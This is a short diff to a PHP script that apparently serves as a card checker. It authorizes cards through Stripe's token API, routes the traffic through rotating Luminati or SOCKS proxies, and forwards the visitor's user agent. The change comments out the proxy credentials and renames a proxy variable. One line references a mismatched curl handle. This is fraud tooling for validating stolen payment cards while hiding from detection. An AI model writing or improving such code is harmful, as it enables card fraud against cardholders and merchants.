@@ -57,11 +57,11 @@ $postcode = $matches1[1][0];
 
 ////////////////////////////===[Luminati Details]
 
-$username = 'Put Zone Username Here';
-$password = 'Put Zone Password Here';
-$port = 22225;
-$session = mt_rand();
-$super_proxy = 'zproxy.lum-superproxy.io';
+///$username = 'Put Zone Username Here';
+///$password = 'Put Zone Password Here';
+///$port = 22225;
+////$session = mt_rand();
+///$super_proxy = 'zproxy.lum-superproxy.io';
 
 ////////////////////////////===[For Authorizing Cards]
 
@@ -70,7 +70,7 @@ $ch = curl_init();
 // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
 // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
 ////////=========Socks Proxy
-curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
+curl_setopt($ch, CURLOPT_PROXY, $poxySocks);
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
